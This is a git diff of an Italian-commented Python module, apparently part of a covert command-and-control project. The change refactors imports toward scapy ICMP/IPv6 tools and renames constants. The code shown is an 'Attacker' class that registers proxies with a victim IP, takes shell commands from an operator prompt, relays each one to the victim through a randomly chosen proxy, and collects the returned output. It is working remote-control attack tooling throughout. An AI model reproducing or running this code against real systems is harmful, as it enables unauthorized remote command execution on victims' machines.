@@ -12,17 +12,14 @@ import random
 import threading
 from functools import partial 
 import json 
-import socket
+import socket 
 
-file_path = "../comunication_methods.py"
-directory = os.path.dirname(file_path)
-sys.path.insert(0, directory)
-import comunication_methods as com
+from mymethods import IS_TYPE as istype, ping_once, IP_INTERFACE as ipinterface, THREADING_EVENT as threadevent 
+from mymethods import TIMER as mytimer, GET as get, SNIFFER as mysniffer, is_scelta_SI_NO, print_dictionary, THREAD as mythread
 
-file_path = "../mymethods.py"
-directory = os.path.dirname(file_path)
-sys.path.insert(0, directory)
-import mymethods 
+from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
+from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
+from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send 
 
 file_path = "./attacksingleton.py"
 directory = os.path.dirname(file_path)
@@ -93,7 +90,7 @@ def unisciDati(dati_separati:dict[str:list]):
     for index in range(len(dati_separati)): 
         #print("DATI: ",dati_separati.get(str(index))) 
         for data in dati_separati.get(str(index)):
-            if data[2]==com.LAST_PACKET:
+            if data[2]==mymethods.LAST_PACKET:
                 continue
             payload.append(data[2])
     return payload
@@ -101,9 +98,9 @@ def unisciDati(dati_separati:dict[str:list]):
 #----------------------------------------- 
 def reset_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[],event_proxy_update:dict={}):
     try:
-        if not com.is_list(proxy_list) or len(proxy_list)<=0:
+        if not istype.list(proxy_list) or len(proxy_list)<=0:
             raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
-        if not com.is_dictionary(event_proxy_update):
+        if not istype.dictionary(event_proxy_update):
             raise ValueError(f"La lista degli eventi non è un dizionmario: {event_proxy_update}")
     except Exception as e:
         raise Exception(f"reset_event_update_foreach_proxy: {e}") 
@@ -117,13 +114,13 @@ def restart_thread(thread_list:dict[str:threading.Thread]):
 
 def create_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
     try:
-        if not com.is_list(proxy_list) or len(proxy_list)<=0:
+        if not istype.list(proxy_list) or len(proxy_list)<=0:
             raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
     except Exception as e:
         raise Exception(f"create_event_update_foreach_proxy: {e}")
     event_proxy_update={}
     for proxy in proxy_list:
-        event_proxy_update.update({proxy.compressed:com.get_threading_Event()})    
+        event_proxy_update.update({proxy.compressed:get.threading_Event()})    
     reset_event_update_foreach_proxy(proxy_list, event_proxy_update)
     #print(f"Eventi creati:\t{event_proxy_update}")
     print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'")
@@ -132,9 +129,9 @@ def create_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipad
 #-----------------------------------------
 def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:dict=None, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
     try:
-        com.is_threading_lock(thread_lock) 
-        com.is_dictionary(thread_response) 
-        if not com.is_list(proxy_list) or len(proxy_list)<=0: 
+        istype.threading_lock(thread_lock) 
+        istype.dictionary(thread_response) 
+        if not istype.list(proxy_list) or len(proxy_list)<=0: 
             raise ValueError("elimina_proxy_nonconnessi: lista proxy non valida")
     except Exception as e:
         raise Exception(f"elimina_proxy_nonconnessi: {e}")
@@ -164,14 +161,14 @@ def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipadd
             socket_proxy.close() 
             proxy_list.pop(proxy_list.index(proxy))
             continue 
-        data=(com.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+com.ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
+        data=(mymethods.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+mymethods.ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
         socket_proxy.sendall(data.encode())
 
         data=socket_proxy.recv(1024).decode()
         print(f"Socket {proxy} Received: {data}") 
-        if not data or data!=(com.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
+        if not data or data!=(mymethods.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
             print(f"Close connection for {proxy}")  
-            socket_proxy.sendall(com.END_COMMUNICATION.encode())
+            socket_proxy.sendall(mymethods.END_COMMUNICATION.encode())
             socket_proxy.close()
             proxy_list.pop(proxy_list.index(proxy)) 
             continue
@@ -330,7 +327,7 @@ class Attacker:
         
         try:
             proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
-            confirm_text=com.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
+            confirm_text=mymethods.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
             data_received=proxy_socket.recv(1024).decode()
             if confirm_text not in data_received: 
                 self.dict_proxy_socket.pop(proxy.compressed)
@@ -354,17 +351,17 @@ class Attacker:
     def send_command_to_victim(self): 
         self.data_lock=threading.Lock()
         self.event_thread_update=create_event_update_foreach_proxy(self.proxy_list) 
-        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_foreach_address(
+        self.thread_lock,self.thread_proxy_response,self.thread_list=mythread.setup_thread_foreach_address(
             self.proxy_list, self.wait_data_from_proxy
         )
-        self.event_received_data=com.get_threading_Event()
+        self.event_received_data=get.threading_Event()
         print("Attivo i thread per ricevere i dati") 
         for thread in self.thread_list.values():
             thread.start()
         
         msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
         command=input(msg) 
-        while command.lower() not in com.exit_cases: 
+        while command.lower() not in mymethods.exit_cases: 
             print(f"Il comando immesso è: {command}")
             try:
                 chosen_proxy=random.choice(self.proxy_list)
@@ -374,13 +371,13 @@ class Attacker:
                 continue
             print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
             socket= self.dict_proxy_socket.get(chosen_proxy.compressed)
-            data=(com.CONFIRM_COMMAND+command)
+            data=(mymethods.CONFIRM_COMMAND+command)
             socket.sendall(data.encode())
             print(f"Gli altri proxy ascolteranno direttamente la vititma")
             for proxy in self.proxy_list:
                 if proxy!=chosen_proxy :
                     socket= self.dict_proxy_socket.get(proxy.compressed)
-                    socket.sendall(com.WAIT_DATA.encode())  
+                    socket.sendall(mymethods.WAIT_DATA.encode())  
             
             for thread in self.thread_list.values(): 
                 thread.join()   
@@ -405,7 +402,7 @@ class Attacker:
         print("Uscita dalla shell\texit")  
         for proxy in self.proxy_list:
             socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
-            socket_proxy.sendall(com.END_COMMUNICATION.encode()) 
+            socket_proxy.sendall(mymethods.END_COMMUNICATION.encode()) 
             socket_proxy.close()
 
     def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
@@ -423,7 +420,7 @@ class Attacker:
             proxy_data.append(data) 
             self.data_lock.release()
             print(f"Received from proxy: {proxy_data}")
-            if com.LAST_PACKET.encode() in data:
+            if mymethods.LAST_PACKET.encode() in data:
                 break
         print("Received all data") 
         return 
@@ -448,7 +445,7 @@ class Attacker:
             self.event_thread_update.get(proxy.compressed).clear() 
         restart_thread(self.thread_list) 
 
-        #com.setup_thread_foreach_address(self.proxy_list, self.wait_data_from_proxy)
+        #mythread.setup_thread_foreach_address(self.proxy_list, self.wait_data_from_proxy)
         
         #thread=threading.Thread(
         #    target= callback_function #wait_proxy_update
